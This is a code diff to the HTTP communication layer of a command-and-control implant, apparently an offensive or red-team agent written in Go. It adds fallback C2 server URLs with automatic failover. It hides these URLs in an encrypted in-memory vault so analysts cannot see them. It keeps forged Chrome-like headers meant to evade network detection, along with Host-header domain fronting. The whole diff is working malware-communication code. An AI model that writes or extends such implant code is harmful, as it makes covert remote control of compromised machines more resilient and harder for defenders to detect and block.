@@ -40,6 +40,7 @@ type configVault struct {
 // as plaintext in memory. These reveal C2 infrastructure and enable traffic decryption.
 type sensitiveConfig struct {
 	BaseURL       string            `json:"b"`
+	FallbackURLs  []string          `json:"f,omitempty"`
 	UserAgent     string            `json:"a"`
 	EncryptionKey string            `json:"k"`
 	CallbackUUID  string            `json:"c"`
@@ -65,6 +66,12 @@ type HTTPProfile struct {
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
 
+	// Fallback C2 URLs for automatic failover when primary is unreachable.
+	FallbackURLs []string
+	// activeURLIdx tracks which URL in the list is currently being used.
+	// 0 = primary (BaseURL), 1+ = fallback URLs. Updated on failover.
+	activeURLIdx int
+
 	// Config vault — encrypted storage for sensitive C2 fields.
 	// When active, the struct fields above are zeroed and all access
 	// goes through getConfig() which decrypts on demand.
@@ -88,7 +95,7 @@ type HTTPProfile struct {
 }
 
 // NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs []string) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -100,6 +107,7 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		GetEndpoint:   getEndpoint,
 		PostEndpoint:  postEndpoint,
 		HostHeader:    hostHeader,
+		FallbackURLs:  fallbackURLs,
 	}
 
 	// Configure TLS based on verification mode
@@ -151,6 +159,7 @@ func (h *HTTPProfile) SealConfig() error {
 
 	cfg := &sensitiveConfig{
 		BaseURL:       h.BaseURL,
+		FallbackURLs:  h.FallbackURLs,
 		UserAgent:     h.UserAgent,
 		EncryptionKey: h.EncryptionKey,
 		CallbackUUID:  h.CallbackUUID,
@@ -177,6 +186,7 @@ func (h *HTTPProfile) SealConfig() error {
 
 	// Zero plaintext struct fields — all access now goes through the vault
 	h.BaseURL = ""
+	h.FallbackURLs = nil
 	h.UserAgent = ""
 	h.EncryptionKey = ""
 	h.CallbackUUID = ""
@@ -196,6 +206,7 @@ func (h *HTTPProfile) getConfig() *sensitiveConfig {
 	if h.vault == nil {
 		return &sensitiveConfig{
 			BaseURL:       h.BaseURL,
+			FallbackURLs:  h.FallbackURLs,
 			UserAgent:     h.UserAgent,
 			EncryptionKey: h.EncryptionKey,
 			CallbackUUID:  h.CallbackUUID,
@@ -788,17 +799,43 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	return decryptedData, nil
 }
 
-// makeRequest is a helper function to make HTTP requests.
+// allURLs returns the full URL list in failover order, starting from activeURLIdx.
+// Index 0 = BaseURL, 1+ = FallbackURLs.
+func (h *HTTPProfile) allURLs(cfg *sensitiveConfig) []string {
+	var baseURL string
+	var fallbacks []string
+	if cfg != nil {
+		baseURL = cfg.BaseURL
+		fallbacks = cfg.FallbackURLs
+	} else {
+		baseURL = h.BaseURL
+		fallbacks = h.FallbackURLs
+	}
+
+	urls := make([]string, 0, 1+len(fallbacks))
+	urls = append(urls, baseURL)
+	urls = append(urls, fallbacks...)
+
+	// Rotate so the currently active URL is first
+	if h.activeURLIdx > 0 && h.activeURLIdx < len(urls) {
+		rotated := make([]string, len(urls))
+		copy(rotated, urls[h.activeURLIdx:])
+		copy(rotated[len(urls)-h.activeURLIdx:], urls[:h.activeURLIdx])
+		return rotated
+	}
+	return urls
+}
+
+// makeRequest is a helper function to make HTTP requests with automatic failover.
+// If the primary URL fails, it tries each fallback URL before returning an error.
 // The cfg parameter provides sensitive fields (BaseURL, UserAgent, etc.)
 // from the decrypted vault rather than reading from zeroed struct fields.
 func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensitiveConfig) (*http.Response, error) {
 	// Resolve sensitive fields from config (vault) or struct (unsealed fallback)
-	baseURL := h.BaseURL
 	userAgent := h.UserAgent
 	hostHeader := h.HostHeader
 	var customHeaders map[string]string
 	if cfg != nil {
-		baseURL = cfg.BaseURL
 		userAgent = cfg.UserAgent
 		hostHeader = cfg.HostHeader
 		customHeaders = cfg.CustomHeaders
@@ -806,75 +843,80 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 		customHeaders = h.CustomHeaders
 	}
 
-	// Ensure proper URL construction with forward slash
-	var reqURL string
-	if strings.HasSuffix(baseURL, "/") && strings.HasPrefix(path, "/") {
-		// Both have slash, remove one
-		reqURL = baseURL + path[1:]
-	} else if !strings.HasSuffix(baseURL, "/") && !strings.HasPrefix(path, "/") {
-		// Neither has slash, add one
-		reqURL = baseURL + "/" + path
-	} else {
-		// One has slash, just concatenate
-		reqURL = baseURL + path
-	}
+	// Get all URLs in failover order (rotated so active URL is first)
+	originalIdx := h.activeURLIdx
+	urls := h.allURLs(cfg)
+	var lastErr error
 
-	var reqBody io.Reader
-	if body != nil {
-		reqBody = bytes.NewReader(body)
-	}
-
-	req, err := http.NewRequest(method, reqURL, reqBody)
-	if err != nil {
-		return nil, fmt.Errorf("failed to create request: %w", err)
-	}
-
-	// Set browser-realistic default headers to blend with legitimate traffic.
-	// These match Chrome's header set and avoid network-level IOCs.
-	// All defaults are overridable via CustomHeaders from the C2 profile.
-	//
-	// Note on header ordering: Go's net/http sends headers in sorted (alphabetical)
-	// order, which differs from Chrome's native ordering. A custom Transport would
-	// be needed to control order for JA4H-level fingerprint matching.
-	req.Header.Set("User-Agent", userAgent)
-	if body != nil {
-		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	}
-	req.Header.Set("Accept", chromeAcceptHeader)
-	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("Accept-Encoding", chromeAcceptEncoding)
-
-	// sec-ch-ua client hint headers — Chrome has sent these on every request
-	// since v89. Missing them is a strong non-browser signal.
-	if secChUa := generateSecChUa(userAgent); secChUa != "" {
-		req.Header.Set("Sec-Ch-Ua", secChUa)
-		req.Header.Set("Sec-Ch-Ua-Mobile", generateSecChUaMobile(userAgent))
-		req.Header.Set("Sec-Ch-Ua-Platform", generateSecChUaPlatform(userAgent))
-	}
-
-	// Upgrade-Insecure-Requests: standard on every navigation request from Chrome
-	req.Header.Set("Upgrade-Insecure-Requests", "1")
-
-	// Apply custom headers from C2 profile — these override any defaults above
-	for k, v := range customHeaders {
-		req.Header.Set(k, v)
-	}
-
-	// Override Host header for domain fronting
-	if hostHeader != "" {
-		req.Host = hostHeader
-	}
-
-	resp, err := h.client.Do(req)
-	if err != nil {
-		// Close body if resp is non-nil on error (e.g., redirect errors)
-		if resp != nil && resp.Body != nil {
-			resp.Body.Close()
+	for i, baseURL := range urls {
+		// Ensure proper URL construction with forward slash
+		var reqURL string
+		if strings.HasSuffix(baseURL, "/") && strings.HasPrefix(path, "/") {
+			reqURL = baseURL + path[1:]
+		} else if !strings.HasSuffix(baseURL, "/") && !strings.HasPrefix(path, "/") {
+			reqURL = baseURL + "/" + path
+		} else {
+			reqURL = baseURL + path
 		}
-		return nil, fmt.Errorf("HTTP request failed: %w", err)
+
+		var reqBody io.Reader
+		if body != nil {
+			reqBody = bytes.NewReader(body)
+		}
+
+		req, err := http.NewRequest(method, reqURL, reqBody)
+		if err != nil {
+			lastErr = fmt.Errorf("failed to create request for %s: %w", baseURL, err)
+			continue
+		}
+
+		// Set browser-realistic default headers
+		req.Header.Set("User-Agent", userAgent)
+		if body != nil {
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		}
+		req.Header.Set("Accept", chromeAcceptHeader)
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Accept-Encoding", chromeAcceptEncoding)
+
+		if secChUa := generateSecChUa(userAgent); secChUa != "" {
+			req.Header.Set("Sec-Ch-Ua", secChUa)
+			req.Header.Set("Sec-Ch-Ua-Mobile", generateSecChUaMobile(userAgent))
+			req.Header.Set("Sec-Ch-Ua-Platform", generateSecChUaPlatform(userAgent))
+		}
+
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+
+		for k, v := range customHeaders {
+			req.Header.Set(k, v)
+		}
+
+		if hostHeader != "" {
+			req.Host = hostHeader
+		}
+
+		resp, err := h.client.Do(req)
+		if err != nil {
+			if resp != nil && resp.Body != nil {
+				resp.Body.Close()
+			}
+			lastErr = fmt.Errorf("HTTP request to %s failed: %w", baseURL, err)
+			if len(urls) > 1 {
+				log.Printf("[INFO] C2 failover: %s failed, trying next URL", baseURL)
+			}
+			continue
+		}
+
+		// Success — remember which URL worked for next time
+		newIdx := (originalIdx + i) % len(urls)
+		if newIdx != originalIdx {
+			h.activeURLIdx = newIdx
+			log.Printf("[INFO] C2 failover: now using %s", baseURL)
+		}
+		return resp, nil
 	}
 
-	return resp, nil
+	return nil, lastErr
 }
 
 // readResponseBody reads and decompresses the response body if needed.
